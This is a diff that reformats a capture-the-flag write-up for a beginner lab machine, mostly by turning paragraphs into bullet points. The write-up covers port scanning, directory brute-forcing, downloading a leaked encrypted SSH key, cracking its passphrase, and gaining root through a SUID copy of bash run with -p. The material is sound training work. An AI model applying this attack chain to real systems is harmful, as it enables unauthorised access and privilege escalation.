@@ -12,8 +12,8 @@
 
 A beginner Boot2Root machine with two objectives:
 
-1. Find the user flag at `/home/john/user.txt`
-2. Escalate privileges to root and find the root flag at `/root/root.txt`
+- Find the user flag at `/home/john/user.txt`
+- Escalate privileges to root and find the root flag at `/root/root.txt`
 
 **Attack path summary:**  
 `nmap` → web enumeration → HTML source leak → encrypted SSH key → passphrase crack → SSH login → SUID bash privesc → root
@@ -50,7 +50,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.58
 ```
 
-**Takeaway:** Only 2 ports open. SSH is rarely the entry point on CTF boxes — it's usually the exit after you find credentials. HTTP is the target.
+- **Takeaway:** Only 2 ports open. SSH is rarely the entry point on CTF boxes — it's usually the exit after you find credentials. HTTP is the target.
 
 ---
 
@@ -71,7 +71,7 @@ gobuster dir -u http://10.48.147.169 -w /usr/share/wordlists/dirb/common.txt -x 
 /uploads       (Status: 301) → /uploads/
 ```
 
-**Why gobuster?** Web servers don't advertise their directories. Gobuster sends GET requests for thousands of common directory names and reports which ones return 200/301 (exist) vs 404 (don't exist).
+- **Why gobuster?** Web servers don't advertise their directories. Gobuster sends GET requests for thousands of common directory names and reports which ones return 200/301 (exist) vs 404 (don't exist).
 
 ### Step 2: Read the HTML source
 
@@ -79,7 +79,7 @@ gobuster dir -u http://10.48.147.169 -w /usr/share/wordlists/dirb/common.txt -x 
 curl -s http://10.48.147.169
 ```
 
-At the bottom of `index.html`, hidden in a comment:
+- At the bottom of `index.html`, hidden in a comment:
 
 ```html
 <!--
@@ -101,7 +101,8 @@ we should remove it before anyone finds it.
 curl http://10.48.147.169/uploads/
 ```
 
-Found: `dict.lst` (46 bytes) — a short wordlist. This is a hint that we'll need to crack something.
+- Found: `dict.lst` (46 bytes) — a short wordlist.
+- This is a hint that we'll need to crack something.
 
 ```bash
 curl http://10.48.147.169/uploads/dict.lst
@@ -131,7 +132,7 @@ curl http://10.48.147.169/secret/secretKey -o john_id_rsa
 chmod 600 john_id_rsa
 ```
 
-**Why `chmod 600`?** SSH refuses to use a private key that is readable by other users. 600 = owner read/write only.
+- **Why `chmod 600`?** SSH refuses to use a private key that is readable by other users. 600 = owner read/write only.
 
 ### Step 2: Identify the key format
 
@@ -139,10 +140,10 @@ chmod 600 john_id_rsa
 cat john_id_rsa
 ```
 
-Header: `-----BEGIN OPENSSH PRIVATE KEY-----`  
-Contains: `aes256-ctr` + `bcrypt` — this key is **encrypted with a passphrase**.
+- Header: `-----BEGIN OPENSSH PRIVATE KEY-----`
+- Contains: `aes256-ctr` + `bcrypt` — this key is **encrypted with a passphrase**.
+- Direct SSH attempt fails:
 
-Direct SSH attempt fails:
 ```
 Load key "john_id_rsa": error in libcrypto
 ```
@@ -196,15 +197,14 @@ CAP26{Sh3ll_0r_B3_Sh3ll3d}
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-**What is SUID?**  
-The SUID (Set User ID) bit causes a file to execute as its *owner* rather than the user running it. If a binary owned by root has SUID set, it runs with root privileges regardless of who executes it.
+- **What is SUID?** The SUID (Set User ID) bit causes a file to execute as its *owner* rather than the user running it. If a binary owned by root has SUID set, it runs with root privileges regardless of who executes it.
 
 **Result — suspicious binary:**
 ```
 /usr/local/bin/backup-helper
 ```
 
-This is not a standard Linux binary. Custom SUID binaries on CTF boxes are almost always the privesc vector.
+- This is not a standard Linux binary. Custom SUID binaries on CTF boxes are almost always the privesc vector.
 
 ### Step 2: Investigate the binary
 
@@ -216,7 +216,7 @@ file /usr/local/bin/backup-helper
 # GNU bash, version 5.2.21
 ```
 
-`backup-helper` is literally a **renamed copy of bash** with the SUID bit set.
+- `backup-helper` is literally a **renamed copy of bash** with the SUID bit set.
 
 ### Step 3: Exploit SUID bash with -p flag
 
@@ -224,15 +224,14 @@ file /usr/local/bin/backup-helper
 /usr/local/bin/backup-helper -p
 ```
 
-**Why `-p`?**  
-By default, bash drops SUID privileges on startup as a security measure (`euid` gets reset to `ruid`). The `-p` flag (`--privileged`) disables this behaviour, keeping the effective UID as root.
+- **Why `-p`?** By default, bash drops SUID privileges on startup as a security measure (`euid` gets reset to `ruid`). The `-p` flag (`--privileged`) disables this behaviour, keeping the effective UID as root.
 
 ```bash
 whoami   # root
 id       # uid=1001(john) gid=1001(john) euid=0(root)
 ```
 
-Note: `uid` is still john (who we are), but `euid` (effective UID) is 0 (root) — which is what matters for file access permissions.
+- Note: `uid` is still john (who we are), but `euid` (effective UID) is 0 (root) — which is what matters for file access permissions.
 
 ---
 
